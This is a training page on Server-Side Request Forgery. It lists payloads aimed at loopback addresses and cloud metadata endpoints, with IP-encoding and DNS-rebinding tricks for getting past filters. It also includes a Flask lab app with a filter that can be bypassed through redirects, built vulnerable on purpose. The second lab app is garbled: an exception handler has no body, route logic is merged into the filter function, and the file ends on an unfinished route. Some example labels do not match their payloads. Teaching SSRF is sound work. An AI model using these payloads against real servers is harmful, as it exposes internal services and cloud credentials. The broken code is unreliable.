Server-Side Request Forgery (SSRF)

What is SSRF?

Server-Side Request Forgery forces the server to make HTTP requests to an attacker-controlled destination or to internal services that are not directly accessible. The server acts as a proxy — the request originates from the server's network position, bypassing firewalls and ACLs.

SSRF TypeDescriptionDetection
Basic (In-Band)Response from the internal request is returned to the attackerData appears in response body
BlindNo response returned — must use out-of-band techniquesDNS/HTTP callbacks to attacker server
Semi-BlindPartial info leaked (status code, timing, error messages)Response differences or timing analysis

Basic SSRF — Accessing Internal Services

If a web app fetches a URL supplied by the user (e.g., URL preview, webhook, PDF generator, image proxy), you can point it at internal resources.

# Typical vulnerable parameter
https://target.com/fetch?url=http://127.0.0.1:8080/admin
https://target.com/proxy?url=http://192.168.1.1/
https://target.com/api/preview?link=http://localhost:3000/debug

# Common internal targets
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/              # IPv6 loopback
http://169.254.169.254/    # Cloud metadata
http://192.168.0.1/        # Internal network

Bypass Techniques

IP Address Representations

Filters that block 127.0.0.1 or localhost can often be bypassed with alternative representations.

# Decimal (127.0.0.1 = 2130706433)
http://2130706433/

# Hex
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/

# Octal
http://0177.0.0.01/
http://0177.0000.0000.0001/

# Mixed notation
http://127.1/                  # Shorthand
http://127.0.1/                # Shorthand
http://0/                      # Some systems resolve to 127.0.0.1

# IPv6
http://[::1]/
http://[0000::1]/
http://[::ffff:127.0.0.1]/     # IPv4-mapped IPv6

# Overflow (256+ wraps around in some parsers)
http://127.0.0.1.nip.io/       # DNS wildcard service
http://127.0.0.1.sslip.io/

DNS Rebinding

Bypass allowlist checks by making a domain resolve to an allowed IP on first lookup (validation), then to 127.0.0.1 on the second lookup (actual request).

# Use a DNS rebinding service
# rbndr.us lets you configure two IPs:
http://7f000001.ALLOWED_IP.rbndr.us/

# The domain alternates between resolving to:
#   1st query: ALLOWED_IP (passes validation)
#   2nd query: 127.0.0.1 (hits internal service)

# Tools: singularity, rebinder, rbndr.us

Lab 3: SSRF with Filter Bypass

Hard

Objective: Bypass a multi-layered SSRF filter to reach an internal service and read a secret file.

# app.py — SSRF with aggressive filtering
from flask import Flask, request
import requests as req
from urllib.parse import urlparse
import re, socket

app = Flask(__name__)

def is_blocked(url):
    """Multi-layer SSRF filter"""
    parsed = urlparse(url)
    host = parsed.hostname or ''

    # Block private IP ranges
    blocked_patterns = [
        r'^127\.', r'^10\.', r'^192\.168\.', r'^172\.(1[6-9]|2\d|3[01])\.',
        r'^0\.', r'^169\.254\.', r'^localhost$', r'^\[?::1\]?$',
        r'^0x', r'^\d+$'  # hex and decimal IPs
    ]
    for pattern in blocked_patterns:
        if re.match(pattern, host, re.IGNORECASE):
            return True

    # Block dangerous schemes
    if parsed.scheme not in ('http', 'https'):
        return True

    # DNS resolution check
    try:
        resolved = socket.getaddrinfo(host, None)
        for entry in resolved:
            ip = entry[4][0]
            if ip.startswith('127.') or ip.startswith('10.') or ip.startswith('192.168.') or ip == '::1':
                return True
    except:
        return True

    return False

@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')
    if not url:
        return '<h1>URL Fetcher</h1><form><input name="url" placeholder="URL"><button>Fetch</button></form>'
    if is_blocked(url):
        return '<p>Blocked by security filter.</p>'
    try:
        resp = req.get(url, timeout=5, allow_redirects=True)
        return f'<pre>{resp.text[:3000]}</pre>'
    except Exception as e:
        return f'<p>Error: {e}</p>'

# Internal secret service
@app.route('/internal/secret')
def secret():
    if request.remote_addr != '127.0.0.1':
        return '403', 403
    return 'TOP_SECRET: ssrf_filter_bypass_complete_42'

app.run(debug=True)

Tasks:

  1. Study the filter — it blocks private IPs, resolves DNS, blocks non-HTTP schemes
  2. Direct IP tricks won't work due to DNS resolution check
  3. Key vulnerability: the filter checks the URL before fetching, but allow_redirects=True
  4. Strategy: host an external redirect that passes the filter check, then 302 redirects to http://127.0.0.1:5000/internal/secret
  5. Alternative: DNS rebinding — domain resolves to your public IP during filter check, then to 127.0.0.1 during fetch
  6. Extract the secret string

# app.py — DNS rebinding target
from flask import Flask, request
import requests as req
import socket
from urllib.parse import urlparse

app = Flask(__name__)

def ssrf_filter(url):
    """Validates hostname resolves to a non-private IP"""
    parsed = urlparse(url)
    host = parsed.hostname
    try:
        ip = socket.gethostbyname(host)
        private_ranges = ['127.', '10.', '192.168.', '172.16.']
        for r in private_ranges:
            if ip.startswith(r):
                return False
    except:

    return True

    # Time gap between check and use — vulnerable to DNS rebinding!
    try:
        resp = req.get(url, timeout=5)
        return f'<pre>{resp.text[:3000]}</pre>'
    except Exception as e:
        return f'<p>Error: {e}</p>'

@app.route('/admin/flag')
